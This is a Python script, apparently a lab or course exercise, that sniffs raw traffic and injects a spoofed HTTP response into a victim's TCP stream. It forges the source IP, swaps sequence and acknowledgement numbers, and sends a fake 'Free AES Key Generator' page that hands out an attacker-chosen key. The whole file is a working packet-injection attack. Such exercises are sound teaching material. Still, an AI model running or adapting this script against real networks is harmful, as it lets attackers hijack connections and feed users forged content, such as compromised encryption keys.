#!/usr/bin/python3
from scapy.all import send, conf, L3RawSocket
import scapy
from scapy.all import raw
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
from scapy.layers.l2 import Ether

import socket
import dpkt
def inject_pkt(pkt):
    #import dnet
    #dnet.ip().send(pkt)
    conf.L3socket=L3RawSocket
    send(pkt)

######
# edit this function to do your attack
######
def handle_pkt(pkt):
        
        #pkt = Ether(pkt)
        #pkt.show()
        temp = b'GET'
        if temp in pkt:
                data = b'HTTP/1.1 200 OK\r\nServer: nginx/1.14.0 (Ubuntu)\r\nDate: Mon, 15 Mar 2021 20:17:29 GMT\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 335\r\nConnection: close\r\n\r\n<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\n</html>'
                
                load = pkt[pkt.index(b'HTTP')-6:(pkt.index(b'close')+13)]
                diff = len(data)-len(load)
                pkt = Ether(pkt)
                ip_len = pkt[IP].len
                ether_dst = pkt[Ether].dst
                ether_src = pkt[Ether].src
                ether_type = pkt[Ether].type
                ip_ihl = pkt[IP].ihl
                ip_tos = pkt[IP].tos
                ip_frag = pkt[IP].frag
                ip_ttl = pkt[IP].ttl
                ip_proto = pkt[IP].proto
                ip_checksum = pkt[IP].chksum
                ip_src = pkt[IP].src
                ip_dst = pkt[IP].dst
                TCP_dport = pkt[TCP].dport
                TCP_sport = pkt[TCP].sport
                TCP_seq = pkt[TCP].seq
                TCP_ack = pkt[TCP].ack
                TCP_dataofs = pkt[TCP].dataofs
                TCP_flags = pkt[TCP].flags
                TCP_window = pkt[TCP].window
                TCP_chksum = pkt[TCP].chksum
                pkt_send = IP(src = '18.234.115.5', ihl = ip_ihl, tos = ip_tos, len = ip_len + diff, frag = ip_frag, ttl = ip_ttl, proto = ip_proto, dst = '10.0.2.15', chksum = 0, id = 54180)/TCP(seq = TCP_ack, ack = TCP_seq, dataofs = TCP_dataofs, flags = 24, window = TCP_window, dport = TCP_sport, sport = TCP_dport, chksum = 0)/data

                del pkt_send[IP].chksum
                del pkt_send[TCP].chksum
                pkt_send = pkt_send.__class__(bytes(pkt_send))
                inject_pkt(pkt_send)
        pass

def main():
    import socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
  
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)
      

if __name__ == '__main__':
    main()
    
